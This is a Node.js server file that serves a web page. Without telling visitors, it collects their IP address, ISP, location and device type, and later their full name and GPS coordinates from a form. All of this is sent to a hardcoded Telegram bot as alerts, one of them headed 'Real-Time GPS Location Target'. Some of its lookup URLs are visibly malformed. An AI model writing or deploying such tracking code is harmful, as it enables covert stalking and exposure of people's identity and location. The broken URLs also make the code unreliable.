const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

function sendTelegramMessage(text) {
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" });
    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, () => {});
    req.write(data); req.end();
}

function queryNetworkDetails(ip, callback) {
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.')) {
        return callback({
            status: "success", city: "Local Dev Machine", regionName: "Local Network",
            country: "Local Host", isp: "Internal Loopback Route", mobile: false
        });
    }
    const endpoint = `https://ip-api.com{ip}?fields=status,country,regionName,city,isp,mobile`;
    https.get(endpoint, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try { callback(JSON.parse(data)); } catch (e) { callback(null); }
        });
    }).on('error', () => callback(null));
}

const server = http.createServer((req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.toLowerCase().includes('uptimerobot') || req.url === '/favicon.ico') {
        res.writeHead(200, { 'Content-Type': 'image/x-icon' }); res.end(); return;
    }

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    
    // FIXED LINE: Splits by comma to handle proxies, grabs the first element, and trims it correctly
    const ipArray = rawIp.split(',');
    const cleanIp = ipArray[0].trim();

    // STEP 1: IMMEDIATELY TRIGGER ALERT UPON SITE ENTRY
    if (req.method === 'GET' && req.url === '/') {
        const time = new Date().toLocaleTimeString();
        
        let deviceModel = "Desktop Computer / Laptop OS";
        if (/iPhone/i.test(userAgent)) deviceModel = "Apple iPhone";
        else if (/iPad/i.test(userAgent)) deviceModel = "Apple iPad";
        else if (/Android/i.test(userAgent)) deviceModel = "Android Phone";

        queryNetworkDetails(cleanIp, (net) => {
            const isp = net && net.status === 'success' ? net.isp : "Private Provider Profile";
            const location = net && net.status === 'success' ? `${net.city}, ${net.regionName}, ${net.country}` : "Unknown Location";
            const type = net && net.mobile ? "📶 Mobile Cellular Data" : "🌐 Fixed Broadband / Wi-Fi";

            // Fire Alert #1 immediately to Telegram
            const alert1 = `⚡ *Instant Connection Alert!*\n\n` +
                           `📶 *IP Address:* \`${cleanIp}\`\n` +
                           `🏢 *Operator (ISP):* ${isp}\n` +
                           `📡 *Connection:* ${type}\n` +
                           `🌍 *ISP Location Area:* ${location}\n` +
                           `📱 *Device Platform:* ${deviceModel}\n` +
                           `⏰ *Time Entry:* ${time}`;
            
            sendTelegramMessage(alert1);
        });

        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content);
        });
    }
    // Block tracking duplicates from internal endpoint checks
    else if (req.method === 'POST' && req.url === '/page-visit') {
        res.writeHead(200); res.end();
    }
    // STEP 2: TRIGGER ACCURATE GPS ALERT UPON SEARCH BUTTON ACTION CLICK
    else if (req.method === 'POST' && req.url === '/search-submit') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                const action = JSON.parse(body);
                const time = new Date().toLocaleTimeString();
                const gpsLink = `https://google.com{action.lat},${action.lon}`;

                // Fire Alert #2 immediately to Telegram
                const alert2 = `🚨 *Form Action Submission Check-In!*\n\n` +
                               `👤 *Full Name Input:* \`${action.fullName.toUpperCase()}\`\n` +
                               `📍 *Hardware GPS Coords:* ${action.lat}, ${action.lon}\n` +
                               `⏰ *Action Time:* ${time}\n\n` +
                               `🗺️ [Open Real-Time GPS Location Target](${gpsLink})`;
                
                sendTelegramMessage(alert2);
            } catch (e) {}
            res.writeHead(200); res.end();
        });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {});
